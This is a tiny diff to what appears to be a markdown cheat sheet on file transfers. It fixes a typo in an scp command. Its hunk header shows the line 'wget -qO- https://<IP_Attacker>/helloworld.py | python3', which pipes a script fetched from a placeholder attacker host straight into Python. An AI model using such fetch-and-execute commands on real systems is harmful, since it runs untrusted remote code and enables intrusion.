@@ -130,7 +130,7 @@ $ wget -qO- https://<IP_Attacker>/helloworld.py | python3
 
 **SSH**
 ````
-$ scp file_download <user>@<IP>:<path_directoru>
+$ scp file_download <user>@<IP>:<path_directory>
 ````
 
 ### Uploads
